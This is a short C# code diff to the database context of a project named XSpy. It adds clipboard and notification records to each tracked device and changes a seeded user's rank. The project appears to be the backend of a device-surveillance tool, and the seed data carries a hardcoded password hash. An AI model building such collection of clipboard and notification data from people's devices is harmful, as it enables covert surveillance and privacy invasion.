@@ -25,6 +25,8 @@ namespace XSpy.Database
             modelBuilder.Entity<Device>().HasMany(s => s.TempPaths).WithOne(s => s.DeviceData);
             modelBuilder.Entity<Device>().HasMany(s => s.SavedFiles).WithOne(s => s.DeviceData);
             modelBuilder.Entity<Device>().HasMany(s => s.ImageList).WithOne(s => s.DeviceData);
+            modelBuilder.Entity<Device>().HasMany(s => s.Clipboards).WithOne(s => s.DeviceData);
+            modelBuilder.Entity<Device>().HasMany(s => s.Notifications).WithOne(s => s.DeviceData);
             modelBuilder.Entity<Rank>().HasMany(s => s.Roles).WithOne(s => s.Rank);
 
 
@@ -83,7 +85,7 @@ namespace XSpy.Database
                 IsActive = true,
                 Password = "$2a$11$SsDzjmfewhAt.q/aLjmfTeqGFEtlNNO08mmw023eQYV6WBJMktDzS",
                 DeviceToken = Guid.NewGuid(),
-                RankId = rank1
+                RankId = rank2
             });
 
 
